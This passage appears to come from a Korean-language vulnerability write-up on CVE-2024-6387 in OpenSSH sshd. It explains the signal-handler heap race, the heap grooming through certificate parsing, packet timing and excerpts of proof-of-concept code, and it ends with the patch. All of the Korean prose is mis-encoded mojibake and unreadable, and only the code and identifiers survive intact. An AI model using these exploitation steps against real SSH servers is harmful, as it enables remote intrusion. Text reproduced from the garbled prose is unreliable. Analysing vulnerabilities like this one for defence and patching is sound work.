  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```
</div>
</details>

<details>
<summary>libio.h:_IO_codecvt</summary>
<div markdown="1">
```c
struct _IO_codecvt
{
  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};
```
</div>
</details>

<details>
<summary>libio.h:_IO_iconv_t</summary>
<div markdown="1">
```c
typedef struct
{
  struct __gconv_step *step;
  struct __gconv_step_data step_data;
} _IO_iconv_t;
```
</div>
</details>

<details>
<summary>gconv.h:__gconv_step</summary>
<div markdown="1">
```c
/* Description of a conversion step.  */
struct __gconv_step
{
  struct __gconv_loaded_object *__shlib_handle;
  const char *__modname;

  /* For internal use by glibc.  (Accesses to this member must occur
     when the internal __gconv_lock mutex is acquired).  */
  int __counter;

  char *__from_name;
  char *__to_name;

  __gconv_fct __fct;
  __gconv_btowc_fct __btowc_fct;
  __gconv_init_fct __init_fct;
  __gconv_end_fct __end_fct;

  /* Information about the number of bytes needed or produced in this
     step.  This helps optimizing the buffer sizes.  */
  int __min_needed_from;
  int __max_needed_from;
  int __min_needed_to;
  int __max_needed_to;

  /* Flag whether this is a stateful encoding or not.  */
  int __stateful;

  void *__data;		/* Pointer to step-local data.  */
};
```
</div>
</details>

<details>
<summary>iconv/gconv.h:__gconv_fct</summary>
<div markdown="1">
```c
/* Type of a conversion function.  */
typedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,
			    const unsigned char **, const unsigned char *,
			    unsigned char **, size_t *, int, int);
```
</div>
</details>

#### Exploit strategy

`SIGALRM`ì— ì˜í•´ì„œ ì–´ë–»ê²Œ `Exploit`ì„ ë‹¬ì„±í•˜ëŠ”ì§€ ì•Œì•„ë´…ì‹œë‹¤.

```c
1449 #define set_head(p, s)       ((p)->mchunk_size = (s))
------------------------------------------------------------------------
3765 _int_malloc (mstate av, size_t bytes)
3766 {
....
3798   nb = checked_request2size (bytes);
....
4295               size = chunksize (victim);
....
4300               remainder_size = size - nb;
....
4316                   remainder = chunk_at_offset (victim, nb);
....
4320                   bck = unsorted_chunks (av);
4321                   fwd = bck->fd;
....
4324                   remainder->bk = bck;
4325                   remainder->fd = fwd;
4326                   bck->fd = remainder;
4327                   fwd->bk = remainder;
....
4337                   set_head (victim, nb | PREV_INUSE |
4338                             (av != &main_arena ? NON_MAIN_ARENA : 0));
4339                   set_head (remainder, remainder_size | PREV_INUSE);
....
4343               void *p = chunk2mem (victim);
....
4345               return p;
```

`malloc`ì—ì„œ `4327`í–‰ì´ ì‹¤í–‰ëœ ì´í›„ì— `4339`í–‰ ì´ì „ì´ ì‹¤í–‰ë˜ê¸°ì „ `SIGALRM`ì— ì˜í•´ `malloc`ì´ ì¤‘ë‹¨ë˜ëŠ” ê²½ìš°ë¥¼ ì´ìš©í•©ë‹ˆë‹¤.

ê·¸ë ‡ê²Œë˜ë©´ `remainder`ê°€ ìª¼ê°œì¡Œì§€ë§Œ í¬ê¸°ëŠ” ê°±ì‹ ë˜ì§€ ì•Šì€ ìƒíƒœë¡œ `unsorted` ë¦¬ìŠ¤íŠ¸ì— ì—°ê²°ë˜ê²Œ ë©ë‹ˆë‹¤. ì´ë•Œì˜ í¬ê¸° í•„ë“œê°’ì€ ê°±ì‹ ë˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì—
ì´ì „ì— ì´ ì²­í¬ë¥¼ í• ë‹¹ë°›ì€ ë°ì´í„°ê°€ ê·¸ëŒ€ë¡œ ë‚¨ì•„ìˆì–´ í•´ë‹¹ ê°’ì´ í¬ê¸° ë°ì´í„°ë¡œ ì‚¬ìš©ë˜ê²Œ ë©ë‹ˆë‹¤. ì´ë ‡ê²Œí•˜ì—¬ ì»¤ì§„ `remainder chunk`ì˜ í¬ê¸°ëŠ” ë’·ìª½ì„ ë®ì–´ì“¸ ìˆ˜ ìˆì„ë§Œí¼ ì»¤ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ì•…ìš©í•˜ëŠ” íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/exploit_process.png"/></p>

- `Large hole`(8KB í¬ê¸°ì˜ freeëœ ì²­í¬)ì™€ `small hole`(`320B` í¬ê¸°ì˜ `free`ëœ ì²­í¬)ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.
- `4KB` í¬ê¸°ì˜ ì²­í¬ë¥¼ ìš”ì²­í•˜ì—¬ `Large hole`ì„ ë‘ ê°œì˜ ì²­í¬ë¡œ ë‚˜ëˆ„ë„ë¡ ìœ ë„í•©ë‹ˆë‹¤.
	- ì´ë•Œ í•´ë‹¹ ì‘ì—…ì— ì˜í•´ `Large hole`ì´ ë‘ ê°œì˜ ì²­í¬ë¡œ ë‚˜ë‰˜ì–´ì§„ ë’¤ ìœ„ì˜ `4339`í–‰ì´ ì‹¤í–‰ë˜ê¸°ì „ì— `SIGALRM`ì— ì˜í•´ì„œ `malloc`ì˜ ì²˜ë¦¬ê°€ ì¤‘ë‹¨ë©ë‹ˆë‹¤.
	- ì´ë ‡ê²Œ ì²˜ë¦¬ê°€ ì¤‘ë‹¨ëœ `free remainder` ì²­í¬ì˜ í¬ê¸°ëŠ” ì´ì „ ê°’ì— ì˜í•´ì„œ ê²°ì •ë©ë‹ˆë‹¤.
	- `remainder`ì˜ í¬ê¸°ê°€ ê°±ì‹ ë˜ì§€ ì•Šê³  ì´ì „ ê°’(ì°Œê±°ê¸° ê°’)ì— ì˜í•´ì„œ í¬ê¸°ê°€ ì¦ê°€í–ˆê¸° ë•Œë¬¸ì— ì²­í¬ëŠ” ë’¤ì˜ `small hole`ê¹Œì§€ ê²¹ì¹˜ê²Œë©ë‹ˆë‹¤.
- `SIGARLM`ì˜ `syslog`ì—ì„œ ì•ì„œ ì•Œì•„ë³¸ íë¦„ì— ì˜í•´ `fopen`ì„ í˜¸ì¶œí•´ `FILE` êµ¬ì¡°ì²´ê°€ `small hole`ì— í• ë‹¹ë©ë‹ˆë‹¤.
	- ì´ëŠ” ì•ì„  ì²˜ë¦¬ì— ì˜í•´ `remainder` ì²­í¬ì™€ ê²¹ì¹˜ëŠ” ì˜ì—­ì´ ë©ë‹ˆë‹¤.
- ì¸ìœ„ì ìœ¼ë¡œ ì¦ê°€í•œ `remainder` ì²­í¬ëŠ” `fopen` ì´í›„ì˜ `__fread_unlocked`ì—ì„œ `4KB read buffer`ë¥¼ í• ë‹¹ë°›ëŠ” ê³¼ì •ì—ì„œ í•œë²ˆ ë” ìª¼ê°œì§€ê²Œë©ë‹ˆë‹¤.
- remainder ì²­í¬ê°€ ê¸°ë¡ë˜ê³  FILEì˜ `_vtable_offset` ë©¤ë²„ê°€ remainder ì²­í¬ì˜ bk í•„ë“œì˜ 3ë²ˆì§¸ ë°”ì´íŠ¸ë¡œ ë®ì–´ì”Œì›Œì§€ê²Œë©ë‹ˆë‹¤.(0x61)
	- ì´ë•Œ `FILE` êµ¬ì¡°ì²´ì˜ `_codevt` ë©¤ë²„ëŠ” `glibc`ì˜ `malloc` ë¹ˆ ì¤‘ í•˜ë‚˜ë¥¼ ê°€ë¦¬í‚¤ê²Œ ë®ì–´ì”Œì›Œì§‘ë‹ˆë‹¤.
	- ì´ë•Œì˜ ê°€ì •ì€ í•´ë‹¹ ì£¼ì†Œë¥¼ ëª¨ë‘ ê³µê²©ìê°€ ì•ˆë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤.

ìœ„ì˜ ì„¤ëª…ë§Œ ë´ë„ ì—„ì²­ë‚˜ê²Œ ê¹Œë‹¤ë¡œìš´ ì¡°ê±´ì´ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ê¹Œë‹¤ë¡œìš´ ì¡°ê±´ë“¤ì„ ë‹¤ì‹œ ì •ë¦¬í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

- ê³µê²©ì„ ì„±ê³µì‹œí‚¤ê¸° ìœ„í•´ì„  `glibc` `FILE` êµ¬ì¡°ì²´ì˜ `_vtable_offset`ì´ í™œì„±í™” ë˜ì–´ìˆì–´ì•¼ í•˜ê¸° ë•Œë¬¸ì— í˜„ì¬ ì •ë¦¬ëœ ê¸€ì—ì„  i386 glibcë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤.
- ë˜í•œ i386 sshdì˜ ë©”ëª¨ë¦¬ê°€ `0xb7200000` ë˜ëŠ” `0xb7400000`ì—ë§Œ ë§¤í•‘ëœë‹¤ëŠ” ì ì„ ì•…ìš©í•©ë‹ˆë‹¤.
	- ì´ë¥¼ ì´ìš©í•´ `ASLR`ì„ ìµœëŒ€í•œ ìš°íšŒí•˜ê³  ì´ë¯¸ ì•Œê³  ìˆëŠ” ì£¼ì†Œë¥¼ í™œìš©í•©ë‹ˆë‹¤.
- ì•ì„  ì–¸ê¸‰ê³¼ ê°™ì´ ì´ë¯¸ ì£¼ì†Œê°’ë“¤ì„ ì•Œê³  ìˆë‹¤ëŠ” ê°€ì •ìœ¼ë¡œ ì‹œì‘ì„ í•˜ê¸° ë•Œë¬¸ì— `_vtable_offset`ì„ ë®ì–´ì“¸ ë•Œ ì“°ëŠ” `bk`ê°’ ì—­ì‹œ `0xb761d7f8`ë¡œ ê³ ì •ì…ë‹ˆë‹¤.
	- í•´ë‹¹ ê°’ì˜ 3ë²ˆì§¸ ë°”ì´íŠ¸ ê°’ì´ `0x61`ì´ë¯€ë¡œ `_vtable_offset`ì´ `0x61`ë¡œ ì˜¤ì—¼ëœë‹¤ê³  ê°€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- `FILE`ì„ ë®ì–´ì“°ê¸° ìœ„í•´ ì •í™•í•œ íƒ€ì´ë°ì— ìœ„ ë ˆì´ì•„ì›ƒì„ ë‹¬ì„±í•œ ìƒíƒœë¡œ `malloc`ì˜ ìˆ˜í–‰ ì¤‘ì— `SIGALRM`ì´ ë°œìƒí•´ì•¼í•©ë‹ˆë‹¤.

ìœ„ì™€ ê°™ì€ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì„±ê³µì ìœ¼ë¡œ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ì‹¤í—˜ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë ˆì´ì•„ì›ƒì„ êµ¬ìƒí•˜ì—¬ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì—ì„œ ëª©ì ì„ ë‹¬ì„±í•˜ë ¤í•©ë‹ˆë‹¤.

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/heap_layout.png"/></p>


í™ ë ˆì´ì•„ì›ƒì„ ì–´ë–»ê²Œ ì´ë ‡ê²Œ ë§Œë“¤ê¹Œìš”? ë‹¤ìŒ í•¨ìˆ˜ë“¤ì„ ì´ìš©í•©ë‹ˆë‹¤.

```c
1754 cert_parse(struct sshbuf *b, struct sshkey *key, struct sshbuf *certbuf)
1755 {
....
1797         while (sshbuf_len(principals) > 0) {
....
1805                 if ((ret = sshbuf_get_cstring(principals, &principal,
....
1820                 key->cert->principals[key->cert->nprincipals++] = principal;
1821         }
------------------------------------------------------------------------
 562 cert_free(struct sshkey_cert *cert)
 563 {
 ...
 572         for (i = 0; i < cert->nprincipals; i++)
 573                 free(cert->principals[i]);
```

í•¨ìˆ˜ ëª…ì—ì„œë„ ë³¼ ìˆ˜ ìˆë“¯ ê³µê°œ í‚¤ íŒŒì‹± ì½”ë“œë¥¼ ì•…ìš©í•´ì„œ ìœ„ì˜ í™ ë ˆì´ì•„ì›ƒì„ ë§Œë“¤ê²Œë©ë‹ˆë‹¤. ì´ë•Œ `cert_parse`ì˜ `1805`í–‰ì— ìœ„ì¹˜í•œ <a href="https://github.com/openssh/openssh-portable/blob/V_9_2/sshkey.c#L1805">`sshbuf_get_cstring`</a>ê³¼ `cert_free`ì˜ `573`í–‰ì— ìœ„ì¹˜í•œ <a href="https://github.com/openssh/openssh-portable/blob/V_9_2/sshkey.c#L573C3-L573C7">`free`</a>ë¥¼ ì´ìš©í•©ë‹ˆë‹¤.

`sshbuf_get_cstring`ì€ ë‹¤ìŒê³¼ ê°™ì´ `malloc`ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```c
int
sshbuf_get_cstring(struct sshbuf *buf, char **valp, size_t *lenp)
{
	size_t len;
	const u_char *p, *z;
	int r;

	if (valp != NULL)
		*valp = NULL;
	if (lenp != NULL)
		*lenp = 0;
	if ((r = sshbuf_peek_string_direct(buf, &p, &len)) != 0)
		return r;
	/* Allow a \0 only at the end of the string */
	if (len > 0 &&
	    (z = memchr(p , '\0', len)) != NULL && z < p + len - 1) {
		SSHBUF_DBG(("SSH_ERR_INVALID_FORMAT"));
		return SSH_ERR_INVALID_FORMAT;
	}
	if ((r = sshbuf_skip_string(buf)) != 0)
		return -1;
	if (valp != NULL) {
		if ((*valp = malloc(len + 1)) == NULL) {
			SSHBUF_DBG(("SSH_ERR_ALLOC_FAIL"));
			return SSH_ERR_ALLOC_FAIL;
		}
		if (len != 0)
			memcpy(*valp, p, len);
		(*valp)[len] = '\0';
	}
	if (lenp != NULL)
		*lenp = (size_t)len;
	return 0;
}
```

ìœ„ì—ì„œ ì•Œì•„ë³¸ í™ ë ˆì´ì•„ì›ƒì„ ë‹¬ì„±í•˜ê¸° ìœ„í•´ì„œ `sshd`ì— ë‹¤ìŒê³¼ ê°™ì€ 5ê°œì˜ ì„œë¡œ ë‹¤ë¥¸ ê³µê°œ í‚¤ íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤.

- a : `tcache` í¬ê¸°ì˜ ì²­í¬ë¥¼ `malloc`í•˜ê³  `free`í•˜ê¸° ìœ„í•œ íŒ¨í‚·
- b : ë‹¤ì–‘í•œ í¬ê¸°(`~8KB`, `320B hole`)ì˜ ì²­í¬ë¥¼ `malloc`í•˜ê³  `free`í•˜ì—¬ 27ê°œì˜ `large hole`, `small hole` ìŒì„ ë§Œë“¤ê¸° ìœ„í•œ íŒ¨í‚·
- c : ì´ë¯¸ `free`ëœ ì²­í¬ë“¤ì´ ìµìŠ¤í”Œë¡œì‡ì—ì„œ ì¡°ì‘ëœ ê°’ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë¯¸ë¦¬ ê°’ë“¤ì„ ì„¸íŒ…í•´ë‘ëŠ” íŒ¨í‚·
	- `remainder`ì˜ í¬ê¸°ë¥¼ í¬ê²Œ ë§Œë“¤ ê°€ì§œ í—¤ë”ë¥¼ ì¤‘ê°„ì— ê¸°ë¡
	- `glibc`ì˜ ë³´ì•ˆ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ê¸° ìœ„í•œ `footer`ë¥¼ `small hole` ë ë¶€ë¶„ì— ê¸°ë¡
	- `fake vtable`ê³¼ `_codecvt` í¬ì¸í„°ë¥¼ `small hole`ì— ê¸°ë¡
- d : ì•ì„œ` free`í•œ ì²­í¬ë“¤ì´ `unsorted bin`ì—ì„œ ê°ê°ì˜ `large bin`ê³¼ `small bin`ì— ë°°ì¹˜ë  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” íŒ¨í‚·
- e : 27ê°œì˜ ìŒì„ ì´ìš©í•´ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ íŒ¨í‚·(ì•ì„œ ì•Œì•„ë³¸ í™ ë ˆì´ì•„ì›ƒ ì¡°ì‘ì„ ìœ„í•œ ì‹œí€€ìŠ¤ ìˆ˜í–‰ : `malloc(~4KB)`, `malloc(304)`, `malloc(~4KB), malloc(304))`

#### Timing strategy

ì—¬ëŸ¬ ì œì•½ ì‚¬í•­ ë•Œë¬¸ì— ê²°ê³¼ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ì—ì„œ ì‹œê°„ì„ ì¸¡ì •í•˜ì—¬ íŒ¨í‚· ì „ì†¡ íƒ€ì´ë°ì„ ë§ì¶”ê²Œë©ë‹ˆë‹¤.
```c
 88 userauth_pubkey(struct ssh *ssh, const char *method)
 89 {
...
138         if (pktype == KEY_UNSPEC) {
139                 /* this is perfectly legal */
140                 verbose_f("unsupported public key algorithm: %s", pkalg);
141                 goto done;
142         }
143         if ((r = sshkey_from_blob(pkblob, blen, &key)) != 0) {
144                 error_fr(r, "parse key");
145                 goto done;
146         }
...
151         if (key->type != pktype) {
152                 error_f("type mismatch for decoded key "
153                     "(received %d, expected %d)", key->type, pktype);
154                 goto done;
155         }
```
- ê³µê°œ í‚¤ íŒ¨í‚· ì¤‘ `pktype`ì— ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê²Œë” ë°ì´í„°ë¥¼ ì„¤ì •í•´ 138~142í–‰ì—ì„œ íŒ¨í‚· ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê²Œ í•©ë‹ˆë‹¤.
- ë‘ ë²ˆì§¸ë¡œ ê³µê°œ í‚¤ íŒ¨í‚· ì¤‘ `key->type`ì— ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê²Œë” ë°ì´í„°ë¥¼ ì„¤ì •í•´ 151~155í–‰ì—ì„œ íŒ¨í‚· ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê²Œ í•©ë‹ˆë‹¤.
- ì´ë•Œ 143í–‰ì— ì¡´ì¬í•˜ëŠ” `sshkey_from_blob`ì€ ê³µê°œí‚¤ë¥¼ íŒŒì‹±í•˜ëŠ” í•¨ìˆ˜ë¡œ ìœ„ì—ì„œ ì•Œì•„ë³¸ ì–‘ì˜†ì—ìˆëŠ” ë‘ í•¨ìˆ˜ì˜ ì‘ë‹µ ì‹œê°„ì˜ ì°¨ê°€ `sshd`ê°€ ê³µê°œ í‚¤ë¥¼ íŒŒì‹±í•˜ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì´ ë©ë‹ˆë‹¤.
- ì´ë¥¼ í†µí•´ ë§ˆì§€ë§‰ íŒ¨í‚·ì˜ ì „ì†¡ì‹œê°„ì„ ì¡°ì ˆí•©ë‹ˆë‹¤.

`sshkey_from_blob`ì€ ë‹¤ìŒê³¼ ê°™ì€ íë¦„ìœ¼ë¡œ `cert_parse`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

<details>
<summary>sshkey.c:sshkey_from_blob</summary>
<div markdown="1">
```c
int
sshkey_from_blob(const u_char *blob, size_t blen, struct sshkey **keyp)
{
	struct sshbuf *b;
	int r;

	if ((b = sshbuf_from(blob, blen)) == NULL)
		return SSH_ERR_ALLOC_FAIL;
	r = sshkey_from_blob_internal(b, keyp, 1);
	sshbuf_free(b);
	return r;
}
```
</div>
</details>

<details>
<summary>sshkey.c:sshkey_from_blob_internal</summary>
<div markdown="1">
```c
static int
sshkey_from_blob_internal(struct sshbuf *b, struct sshkey **keyp,
    int allow_cert)
{
	int type, ret = SSH_ERR_INTERNAL_ERROR;
	char *ktype = NULL;
	struct sshkey *key = NULL;
	struct sshbuf *copy;
	const struct sshkey_impl *impl;

#ifdef DEBUG_PK /* XXX */
	sshbuf_dump(b, stderr);
#endif
	if (keyp != NULL)
		*keyp = NULL;
	if ((copy = sshbuf_fromb(b)) == NULL) {
		ret = SSH_ERR_ALLOC_FAIL;
		goto out;
	}
	if (sshbuf_get_cstring(b, &ktype, NULL) != 0) {
		ret = SSH_ERR_INVALID_FORMAT;
		goto out;
	}

	type = sshkey_type_from_name(ktype);
	if (!allow_cert && sshkey_type_is_cert(type)) {
		ret = SSH_ERR_KEY_CERT_INVALID_SIGN_KEY;
		goto out;
	}
	if ((impl = sshkey_impl_from_type(type)) == NULL) {
		ret = SSH_ERR_KEY_TYPE_UNKNOWN;
		goto out;
	}
	if ((key = sshkey_new(type)) == NULL) {
		ret = SSH_ERR_ALLOC_FAIL;
		goto out;
	}
	if (sshkey_type_is_cert(type)) {
		/* Skip nonce that preceeds all certificates */
		if (sshbuf_get_string_direct(b, NULL, NULL) != 0) {
			ret = SSH_ERR_INVALID_FORMAT;
			goto out;
		}
	}
	if ((ret = impl->funcs->deserialize_public(ktype, b, key)) != 0)
		goto out;

	/* Parse certificate potion */
	if (sshkey_is_cert(key) && (ret = cert_parse(b, key, copy)) != 0)
		goto out;

	if (key != NULL && sshbuf_len(b) != 0) {
		ret = SSH_ERR_INVALID_FORMAT;
		goto out;
	}
	ret = 0;
	if (keyp != NULL) {
		*keyp = key;
		key = NULL;
	}
 out:
	sshbuf_free(copy);
	sshkey_free(key);
	free(ktype);
	return ret;
}
```
</div>
</details>

ì‚¬ì‹¤ìƒ ìœ„ì—ì„œ ì•Œì•„ë³¸ ì œì•½ ì‚¬í•­ ë•Œë¬¸ì— í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•˜ëŠ” ê²ƒì€ ë§ì´ í˜ë“¤ì–´ë³´ì…ë‹ˆë‹¤. ë˜í•œ í™˜ê²½ì— ëŒ€í•œ ì œì•½ ì—­ì‹œ í½ë‹ˆë‹¤. ì´ì œ PoCë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.

# PoC Analysis

<a href="https://github.com/lflare/cve-2024-6387-poc/tree/master">PoC</a>ê°€ í˜„ì¬ ê³µê°œëœ ìƒíƒœì§€ë§Œ ì˜ë„ì ìœ¼ë¡œ í•´ë‹¹ PoCëŠ” ì‘ë™í•˜ì§€ì•Šê²Œ ì‘ì„±ë˜ì–´ìˆìŠµë‹ˆë‹¤.


<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/commit_history.png"/></p><br>

PoCëŠ” ì•ì„œ ì•Œì•„ë³¸ ë‹¤ìŒê³¼ ê°™ì€ ìˆœì„œë¡œ íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤.

- a : `tcache` í¬ê¸°ì˜ ì²­í¬ë¥¼ `malloc`í•˜ê³  `free`í•˜ê¸° ìœ„í•œ íŒ¨í‚·
- b : ë‹¤ì–‘í•œ í¬ê¸°(`~8KB`, `320B hole`)ì˜ ì²­í¬ë¥¼ `malloc`í•˜ê³  `free`í•˜ì—¬ 27ê°œì˜ `large hole`, `small hole` ìŒì„ ë§Œë“¤ê¸° ìœ„í•œ íŒ¨í‚·
- c : ì´ë¯¸ `free`ëœ ì²­í¬ë“¤ì´ ìµìŠ¤í”Œë¡œì‡ì—ì„œ ì¡°ì‘ëœ ê°’ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë¯¸ë¦¬ ê°’ë“¤ì„ ì„¸íŒ…í•´ë‘ëŠ” íŒ¨í‚·
	- `remainder`ì˜ í¬ê¸°ë¥¼ í¬ê²Œ ë§Œë“¤ ê°€ì§œ í—¤ë”ë¥¼ ì¤‘ê°„ì— ê¸°ë¡
	- `glibc`ì˜ ë³´ì•ˆ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ê¸° ìœ„í•œ `footer`ë¥¼ `small hole` ë ë¶€ë¶„ì— ê¸°ë¡
	- `fake vtable`ê³¼ `_codecvt` í¬ì¸í„°ë¥¼ `small hole`ì— ê¸°ë¡
- d : ì•ì„œ `free`í•œ ì²­í¬ë“¤ì´ `unsorted bin`ì—ì„œ ê°ê°ì˜ `large bin`ê³¼ `small bin`ì— ë°°ì¹˜ë  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” íŒ¨í‚·
- e : 27ê°œì˜ ìŒì„ ì´ìš©í•´ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ íŒ¨í‚·(ì•ì„œ ì•Œì•„ë³¸ í™ ë ˆì´ì•„ì›ƒ ì¡°ì‘ì„ ìœ„í•œ ì‹œí€€ìŠ¤ ìˆ˜í–‰ : `malloc(~4KB)`, `malloc(304)`, `malloc(~4KB), malloc(304))`

PoCì—ì„œ ì—­ì‹œ `glibc`ë¥¼ ë‹¤ìŒê³¼ ê°™ì€ ë‘ ê°œì˜ ì£¼ì†Œì¤‘ í•˜ë‚˜ë¼ê³  ê°€ì •í•©ë‹ˆë‹¤.

```c
// Possible glibc base addresses (for ASLR bypass)
uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof (GLIBC_BASES) / sizeof (GLIBC_BASES[0]);
```

`main` í•¨ìˆ˜ì˜ í•µì‹¬ì ì¸ ë¶€ë¶„ì„ ì‚´í´ë´…ì‹œë‹¤.

```c
int
main (int argc, char *argv[])
{
  ...
          prepare_heap (sock);
          time_final_packet (sock, &parsing_time);

          if (attempt_race_condition (sock, parsing_time, glibc_base))
            {
              printf ("Possible exploitation success on attempt %d with glibc "
                      "base 0x%lx!\n",
                      attempt, glibc_base);
              success = 1;
              break;
            }
}
```

ìœ„ì— ë‚˜íƒ€ë‚œ í•¨ìˆ˜ë“¤ ì¤‘ `prepare_heap` í•¨ìˆ˜ì—ì„œ a~dì˜ ì—­í• ì„ í•˜ëŠ” íŒ¨í‚·ë“¤ì´ ì „ì†¡ë©ë‹ˆë‹¤.
```c
void
prepare_heap (int sock)
{
  // Packet a: Allocate and free tcache chunks
  for (int i = 0; i < 10; i++)
    {
      unsigned char tcache_chunk[64];
      memset (tcache_chunk, 'A', sizeof (tcache_chunk));
      send_packet (sock, 5, tcache_chunk, sizeof (tcache_chunk));
      // These will be freed by the server, populating tcache
    }

  // Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
  for (int i = 0; i < 27; i++)
    {
      // Allocate large chunk (~8KB)
      unsigned char large_hole[8192];
      memset (large_hole, 'B', sizeof (large_hole));
      send_packet (sock, 5, large_hole, sizeof (large_hole));

      // Allocate small chunk (320B)
      unsigned char small_hole[320];
      memset (small_hole, 'C', sizeof (small_hole));
      send_packet (sock, 5, small_hole, sizeof (small_hole));
    }

  // Packet c: Write fake headers, footers, vtable and _codecvt pointers
  for (int i = 0; i < 27; i++)
    {
      unsigned char fake_data[4096];
      create_fake_file_structure (fake_data, sizeof (fake_data),
                                  GLIBC_BASES[0]);
      send_packet (sock, 5, fake_data, sizeof (fake_data));
    }

  // Packet d: Ensure holes are in correct malloc bins (send ~256KB string)
  unsigned char large_string[MAX_PACKET_SIZE - 1];
  memset (large_string, 'E', sizeof (large_string));
  send_packet (sock, 5, large_string, sizeof (large_string));
}
```

`prepare_heap`ì´ ì™„ë£Œë˜ë©´ `time_final_paket` í•¨ìˆ˜ë¥¼ í†µí•´ì„œ ê³µê°œí‚¤ê°€ íŒŒì‹±ë˜ëŠ” íƒ€ì´ë°ì„ ì•Œì•„ëƒ…ë‹ˆë‹¤.
```c
void
time_final_packet (int sock, double *parsing_time)
{
  double time_before = measure_response_time (sock, 1);
  double time_after = measure_response_time (sock, 2);
  *parsing_time = time_after - time_before;

  printf ("Estimated parsing time: %.6f seconds\n", *parsing_time);
}
```

ìœ„ì—ì„œ ì•Œì•„ë‚¸ íƒ€ì´ë°ì„ ê¸°ë°˜ìœ¼ë¡œ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.
```c
...
attempt_race_condition (sock, parsing_time, glibc_base)
...
```

# Patch

`sshd.c`ì— ìœ„ì¹˜í•œ <a href="https://github.com/openssh/openssh-portable/blob/V_9_7/sshd.c#L353">grace_alarm_handler</a> í•¨ìˆ˜ê°€ `sshd-session.c`ë¡œ ì˜®ê²¨ê°€ë©° ë‹¤ìŒê³¼ ê°™ì´ ì½”ë“œê°€ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.

```c
/*
 * Signal handler for the alarm after the login grace period has expired.
 * As usual, this may only take signal-safe actions, even though it is
 * terminal.
 */
static void
grace_alarm_handler(int sig)
{
	/*
	 * Try to kill any processes that we have spawned, E.g. authorized
	 * keys command helpers or privsep children.
	 */
	if (getpgid(0) == getpid()) {
		struct sigaction sa;

		/* mask all other signals while in handler */
		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = SIG_IGN;
		sigfillset(&sa.sa_mask);
		sa.sa_flags = SA_RESTART;
		(void)sigaction(SIGTERM, &sa, NULL);
		kill(0, SIGTERM);
	}
	_exit(EXIT_LOGIN_GRACE);
}
```

# References

